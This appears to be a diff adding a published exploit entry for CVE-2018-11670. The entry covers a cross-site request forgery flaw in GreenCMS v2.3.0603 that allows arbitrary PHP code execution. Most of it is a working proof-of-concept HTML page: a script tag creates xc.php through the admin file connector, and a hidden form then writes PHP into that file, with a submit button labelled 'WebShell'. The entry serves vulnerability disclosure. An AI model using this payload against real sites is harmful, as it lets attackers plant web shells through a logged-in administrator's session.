@@ -1,0 +1,33 @@
+# Exploit Title: GreenCMS v2.3.0603 CSRF vulnerability get webshell
+# Date: 2018-06-02
+# Exploit Author: xichao
+# Vendor Homepage: https://github.com/GreenCMS/GreenCMS
+# Software Link: https://github.com/GreenCMS/GreenCMS
+# Version: v2.3.0603
+# CVE : CVE-2018-11670
+ 
+An issue was discovered in GreenCMS v2.3.0603. There is a CSRF vulnerability that
+allows attackers to execute arbitrary PHP code via the content parameter to index.php?m=admin&c=media&a=fileconnect.
+
+poc:
+
+<span style="font-size:18px;"><!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <title>csrftest</title> 
+</head> 
+<form action="http://127.0.0.1//14/index.php?m=admin&c=media&a=fileconnect" method="POST" id="transfer" name="transfer">
+    <script src="http://127.0.0.1/14/index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=xc.php&target=l1_XA&_=1527839615462"></script>
+    <input type="hidden" name="cmd" value="put">
+    <input type="hidden" name="target" value="l1_eGMucGhw">
+　    <input type="hidden" name="content" value="<?php phpinfo();?>">
+    <button type="submit" value="Submit">WebShell</button>
+    </form>
+    </body>
+</html></span>
+
+References:
+http://www.iwantacve.cn/index.php/archives/38/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11670
+https://github.com/GreenCMS/GreenCMS/issues/108
